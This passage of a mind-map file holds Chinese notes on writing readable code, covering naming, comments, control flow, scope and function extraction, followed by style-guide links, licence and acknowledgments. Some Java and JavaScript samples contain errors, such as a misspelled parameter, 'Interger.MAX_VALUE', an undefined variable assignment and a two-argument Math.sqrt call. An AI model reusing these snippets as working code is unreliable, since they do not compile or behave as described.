      为名字添加形容词等信息能让名字更具有表达力，但是名字也会变长。名字长短的准则是：作用域越大，名字越长。因此只有在短作用域才能使用一些简单名字。
    </p>
    <p>
      起完名字要思考一下别人会对这个名字有何解读，会不会误解了原本想表达的含义。
    </p>
    <p>
      布尔相关的命名加上 is、can、should、has 等前缀。
    </p>
    <ul>
      <li>
        <p>
          用 min、max 表示数量范围；
        </p>
      </li>
      <li>
        <p>
          用 first、last 表示访问空间的包含范围；
        </p>
      </li>
      <li>
        <p>
          begin、end 表示访问空间的排除范围，即 end 不包含尾部。
        </p>
      </li>
    </ul>
    <p>
      <img src="https://camo.githubusercontent.com/b222ad142461e3487cf90690f0da60ba4003f6205109a7b92668dbb6edc8bcc3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230393030333435333236382e706e67" width="1212" height="654" style="width: 1212px; height: 654px;"/>
      <br/>
      
    </p>
    <p>
      适当的空行和缩进。
    </p>
    <p>
      排列整齐的注释：
    </p>
    <pre><code class="language-plaintext">int a = 1;   // 注释
int b = 11;  // 注释
int c = 111; // 注释</code></pre>
    <p>
      语句顺序不能随意，比如与 html 表单相关联的变量的赋值应该和表单在 html 中的顺序一致。
    </p>
    <p>
      阅读代码首先会注意到注释，如果注释没太大作用，那么就会浪费代码阅读的时间。那些能直接看出含义的代码不需要写注释，特别是不需要为每个方法都加上注释，比如那些简单的 getter 和 setter 方法，为这些方法写注释反而让代码可读性更差。
    </p>
    <p>
      不能因为有注释就随便起个名字，而是争取起个好名字而不写注释。
    </p>
    <p>
      可以用注释来记录采用当前解决办法的思考过程，从而让读者更容易理解代码。
    </p>
    <p>
      注释用来提醒一些特殊情况。
    </p>
    <p>
      用 TODO 等做标记：
    </p>
    <div class="tableWrapper">
      <table>
        <colgroup>
        <col/>
        <col/>
        </colgroup>
        

        <tr>
          <th colspan="1" rowspan="1">
            <p>
              标记
            </p>
          </th>
          <th colspan="1" rowspan="1">
            <p>
              用法
            </p>
          </th>
        </tr>
        <tr>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              TODO
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              待做
            </p>
          </td>
        </tr>
        <tr>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              FIXME
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              待修复
            </p>
          </td>
        </tr>
        <tr>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              HACK
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              粗糙的解决方案
            </p>
          </td>
        </tr>
        <tr>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              XXX
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              危险！这里有重要的问题
            </p>
          </td>
        </tr>
      </table>
    </div>
    <p>
      尽量简洁明了：
    </p>
    <pre><code class="language-plaintext">// The first String is student's name
// The Second Integer is student's score
Map&lt;String, Integer&gt; scoreMap = new HashMap&lt;&gt;();</code></pre>
    <pre><code class="language-plaintext">// Student's name -&gt; Student's score
Map&lt;String, Integer&gt; scoreMap = new HashMap&lt;&gt;();</code></pre>
    <p>
      添加测试用例来说明：
    </p>
    <pre><code class="language-plaintext">// ...
// Example: add(1, 2), return 3
int add(int x, int y) {
    return x + y;
}</code></pre>
    <p>
      使用专业名词来缩短概念上的解释，比如用设计模式名来说明代码。
    </p>
    <p>
      条件表达式中，左侧是变量，右侧是常数。比如下面第一个语句正确：
    </p>
    <pre><code class="language-plaintext">if (len &lt; 10)
if (10 &gt; len)</code></pre>
    <p>
      只有在逻辑简单的情况下使用 ? : 三目运算符来使代码更紧凑，否则应该拆分成 if / else；
    </p>
    <p>
      do / while 的条件放在后面，不够简单明了，并且会有一些迷惑的地方，最好使用 while 来代替。
    </p>
    <p>
      如果只有一个 goto 目标，那么 goto 尚且还能接受，但是过于复杂的 goto 会让代码可读性特别差，应该避免使用 goto。
    </p>
    <p>
      在嵌套的循环中，用一些 return 语句往往能减少嵌套的层数。
    </p>
    <p>
      长表达式的可读性很差，可以引入一些解释变量从而拆分表达式：
    </p>
    <pre><code class="language-plaintext">if line.split(':')[0].strip() == &quot;root&quot;:
    ...</code></pre>
    <pre><code class="language-plaintext">username = line.split(':')[0].strip()
if username == &quot;root&quot;:
    ...</code></pre>
    <p>
      使用摩根定理简化一些逻辑表达式：
    </p>
    <pre><code class="language-plaintext">if (!a &amp;&amp; !b) {
    ...
}</code></pre>
    <pre><code class="language-plaintext">if (!(a || b)) {
    ...
}</code></pre>
    <p>
      <strong>去除控制流变量</strong>&#xa0;。在循环中通过使用 break 或者 return 可以减少控制流变量的使用。
    </p>
    <pre><code class="language-plaintext">boolean done = false;
while (/* condition */ &amp;&amp; !done) {
    ...
    if ( ... ) {
        done = true;
        continue;
    }
}</code></pre>
    <pre><code class="language-plaintext">while(/* condition */) {
    ...
    if ( ... ) {
        break;
    }
}</code></pre>
    <p>
      <strong>减小变量作用域</strong>&#xa0;。作用域越小，越容易定位到变量所有使用的地方。
    </p>
    <p>
      JavaScript 可以用闭包减小作用域。以下代码中 submit_form 是函数变量，submitted 变量控制函数不会被提交两次。第一个实现中 submitted 是全局变量，第二个实现把 submitted 放到匿名函数中，从而限制了起作用域范围。
    </p>
    <pre><code class="language-plaintext">submitted = false;
var submit_form = function(form_name) {
    if (submitted) {
        return;
    }
    submitted = true;
};</code></pre>
    <pre><code class="language-plaintext">var submit_form = (function() {
    var submitted = false;
    return function(form_name) {
        if(submitted) {
            return;
        }
        submitted = true;
    }
}());  // () 使得外层匿名函数立即执行</code></pre>
    <p>
      JavaScript 中没有用 var 声明的变量都是全局变量，而全局变量很容易造成迷惑，因此应当总是用 var 来声明变量。
    </p>
    <p>
      变量定义的位置应当离它使用的位置最近。
    </p>
    <p>
      <strong>实例解析</strong>
    </p>
    <p>
      在一个网页中有以下文本输入字段：
    </p>
    <pre><code class="language-plaintext">&lt;input type = &quot;text&quot; id = &quot;input1&quot; value = &quot;a&quot;&gt;
&lt;input type = &quot;text&quot; id = &quot;input2&quot; value = &quot;b&quot;&gt;
&lt;input type = &quot;text&quot; id = &quot;input3&quot; value = &quot;&quot;&gt;
&lt;input type = &quot;text&quot; id = &quot;input4&quot; value = &quot;d&quot;&gt;</code></pre>
    <p>
      现在要接受一个字符串并把它放到第一个空的 input 字段中，初始实现如下：
    </p>
    <pre><code class="language-plaintext">var setFirstEmptyInput = function(new_alue) {
    var found = false;
    var i = 1;
    var elem = document.getElementById('input' + i);
    while (elem != null) {
        if (elem.value === '') {
            found = true;
            break;
        }
        i++;
        elem = document.getElementById('input' + i);
    }
    if (found) elem.value = new_value;
    return elem;
}</code></pre>
    <p>
      以上实现有以下问题：
    </p>
    <ul>
      <li>
        <p>
          found 可以去除；
        </p>
      </li>
      <li>
        <p>
          elem 作用域过大；
        </p>
      </li>
      <li>
        <p>
          可以用 for 循环代替 while 循环；
        </p>
      </li>
    </ul>
    <pre><code class="language-plaintext">var setFirstEmptyInput = function(new_value) {
    for (var i = 1; true; i++) {
        var elem = document.getElementById('input' + i);
        if (elem === null) {
            return null;
        }
        if (elem.value === '') {
            elem.value = new_value;
            return elem;
        }
    }
};</code></pre>
    <p>
      工程学就是把大问题拆分成小问题再把这些问题的解决方案放回一起。
    </p>
    <p>
      首先应该明确一个函数的高层次目标，然后对于不是直接为了这个目标工作的代码，抽取出来放到独立的函数中。
    </p>
    <p>
      介绍性的代码：
    </p>
    <pre><code class="language-plaintext">int findClostElement(int[] arr) {
    int clostIdx;
    int clostDist = Interger.MAX_VALUE;
    for (int i = 0; i &lt; arr.length; i++) {
        int x = ...;
        int y = ...;
        int z = ...;
        int value = x * y * z;
        int dist = Math.sqrt(Math.pow(value, 2), Math.pow(arr[i], 2));
        if (dist &lt; clostDist) {
            clostIdx = i;
            clostDist = value;
        }
    }
    return clostIdx;
}</code></pre>
    <p>
      以上代码中循环部分主要计算距离，这部分不属于代码高层次目标，高层次目标是寻找最小距离的值，因此可以把这部分代替提取到独立的函数中。这样做也带来一个额外的好处有：可以单独进行测试、可以快速找到程序错误并修改。
    </p>
    <pre><code class="language-plaintext">public int findClostElement(int[] arr) {
    int clostIdx;
    int clostDist = Interger.MAX_VALUE;
    for (int i = 0; i &lt; arr.length; i++) {
        int dist = computDist(arr, i);
        if (dist &lt; clostDist) {
            clostIdx = i;
            clostDist = value;
        }
    }
    return clostIdx;
}</code></pre>
    <p>
      并不是函数抽取的越多越好，如果抽取过多，在阅读代码的时候可能需要不断跳来跳去。只有在当前函数不需要去了解某一块代码细节而能够表达其内容时，把这块代码抽取成子函数才是好的。
    </p>
    <p>
      函数抽取也用于减小代码的冗余。
    </p>
    <p>
      只做一件事的代码很容易让人知道其要做的事；
    </p>
    <p>
      基本流程：列出代码所做的所有任务；把每个任务拆分到不同的函数，或者不同的段落。
    </p>
    <p>
      先用自然语言书写代码逻辑，也就是伪代码，然后再写代码，这样代码逻辑会更清晰。
    </p>
    <p>
      不要过度设计，编码过程会有很多变化，过度设计的内容到最后往往是无用的。
    </p>
    <p>
      多用标准库实现。
    </p>
    <ul>
      <li>
        <p>
          Dustin, Boswell, Trevor, 等. 编写可读代码的艺术 [M]. 机械工业出版社, 2012.
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_710978505" CREATED="1754749815225" MODIFIED="1754750694794" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E4%BB%A3%E7%A0%81%E9%A3%8E%E6%A0%BC%E8%A7%84%E8%8C%83.md" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      代码风格规范
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1890632133" CREATED="1754750694784" MODIFIED="1754750694786" LINK="https://github.com/twitter/commons/blob/master/src/java/com/twitter/common/styleguide.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    Twitter Java Style Guide
  </body>
</html>
</richcontent>
</node>
<node ID="ID_974714082" CREATED="1754750694787" MODIFIED="1754750694789" LINK="http://google.github.io/styleguide/javaguide.html"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <span rel="nofollow">Google Java Style Guide</span>
  </body>
</html>
</richcontent>
</node>
<node ID="ID_912097589" CREATED="1754750694791" MODIFIED="1754750694792" LINK="https://github.com/alibaba/p3c"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    阿里巴巴Java开发手册
  </body>
</html>
</richcontent>
</node>
</node>
</node>
<node FOLDED="true" POSITION="top_or_left" ID="ID_1706620776" CREATED="1754749744703" MODIFIED="1754749797744"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <strong>后记</strong>
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_763917348" CREATED="1754749744708" MODIFIED="1754749744712"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <strong>排版</strong>
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      笔记内容按照&#xa0;<a href="https://github.com/sparanoid/chinese-copywriting-guidelines/blob/master/README.zh-CN.md">中文文案排版指北</a>&#xa0;进行排版，以保证内容的可读性。
    </p>
    <p>
      不使用&#xa0;<code>![]()</code>&#xa0;这种方式来引用图片，而是用&#xa0;<code>&lt;img&gt;</code>&#xa0;标签。一方面是为了能够控制图片以合适的大小显示，另一方面是因为&#xa0;<a href="https://github.github.com/gfm/">GFM</a>&#xa0;不支持&#xa0;<code>&lt;center&gt; ![]() &lt;/center&gt;</code>&#xa0;这种方法让图片居中显示，只能使用&#xa0;<code>&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;&quot;/&gt; &lt;/div&gt;</code>&#xa0;达到居中的效果。
    </p>
    <p>
      在线排版工具：<a href="https://github.com/CyC2018/Text-Typesetting">Text-Typesetting</a>。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1211267165" CREATED="1754749744713" MODIFIED="1754749744716"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <strong>License</strong>
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      本仓库的内容不是将网上的资料随意拼凑而来，除了少部分引用书上和技术文档的原文（这部分内容都在末尾的参考链接中加了出处），其余都是我的原创。在您引用本仓库内容或者对内容进行修改演绎时，请署名并以相同方式共享，谢谢。
    </p>
    <p>
      转载文章请在开头明显处标明该页面地址，公众号等其它转载请联系&#xa0;<a href="mailto:zhengyc101@163.com">zhengyc101@163.com</a>。
    </p>
    <p>
      Logo：<a href="https://logomakr.com/">logomakr</a>
    </p>
    <p>
      <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://camo.githubusercontent.com/62be294f71c9a1885f9cd8f54aa8b8bd42d432fd14b5393a8b25bcd1f34daa42/68747470733a2f2f692e6372656174697665636f6d6d6f6e732e6f72672f6c2f62792d6e632d73612f342e302f38387833312e706e67" alt="知识共享许可协议"/>
</a>    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1419263255" CREATED="1754749744717" MODIFIED="1754749840898"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <strong>致谢</strong>
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      感谢以下人员对本仓库做出的贡献，当然不仅仅只有这些贡献者，这里就不一一列举了。如果你希望被添加到这个名单中，并且提交过 Issue 或者 PR，请与我联系。
    </p>
    <p>
      <a href="https://github.com/linw7"><img src="https://avatars3.githubusercontent.com/u/21679154?s=400&amp;v=4" width="49" height="49" style="width: 49px; height: 49px;"/>
      &#xa0;</a><a href="https://github.com/g10guang"><img src="https://avatars1.githubusercontent.com/u/18458140?s=400&amp;v=4" width="55" height="55" style="width: 55px; height: 55px;"/>&#xa0;</a><a href="https://github.com/Sctwang"><img src="https://avatars3.githubusercontent.com/u/33345444?s=400&amp;v=4" width="58" height="58" style="width: 58px; height: 58px;"/>&#xa0;</a><a href="https://github.com/ResolveWang"><img src="https://avatars1.githubusercontent.com/u/8018776?s=400&amp;v=4" width="28" height="28" style="width: 28px; height: 28px;"/>&#xa0;</a><a href="https://github.com/crossoverJie"><img src="https://avatars1.githubusercontent.com/u/15684156?s=400&amp;v=4" width="55" height="55" style="width: 55px; height: 55px;"/>&#xa0;</a><a href="https://github.com/jy03078584"><img src="https://avatars2.githubusercontent.com/u/7719370?s=400&amp;v=4" width="37" height="37" style="width: 37px; height: 37px;"/>&#xa0;</a><a href="https://github.com/kwongtailau"><img src="https://avatars0.githubusercontent.com/u/22954582?s=400&amp;v=4" width="55" height="55" style="width: 55px; height: 55px;"/>&#xa0;</a><a href="https://github.com/xiangflight"><img src="https://avatars2.githubusercontent.com/u/10072416?s=400&amp;v=4" width="55" height="55" style="width: 55px; height: 55px;"/>&#xa0;</a><a href="https://github.com/mafulong"><img src="https://avatars1.githubusercontent.com/u/24795000?s=400&amp;v=4" width="55" height="55" style="width: 55px; height: 55px;"/>&#xa0;</a><a href="https://github.com/yanglbme"><img src="https://avatars1.githubusercontent.com/u/21008209?s=400&amp;v=4" width="55" height="55" style="width: 55px; height: 55px;"/>&#xa0;</a><a href="https://github.com/OOCZC"><img src="https://avatars1.githubusercontent.com/u/11623828?s=400&amp;v=4" width="52" height="52" style="width: 52px; height: 52px;"/>&#xa0;</a><a href="https://github.com/5renyuebing"><img src="https://avatars1.githubusercontent.com/u/32872430?s=400&amp;v=4" width="35" height="35" style="width: 35px; height: 35px;"/></a>
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node TEXT="脑图作者：极客脑图" STYLE_REF="note" POSITION="top_or_left" ID="ID_804742720" CREATED="1754789434065" MODIFIED="1754789434121" LINK="https://github.com/ThrowPeterInvalidException/geekmap-cs" TAGS="geekmap"/>
</node>
</map>
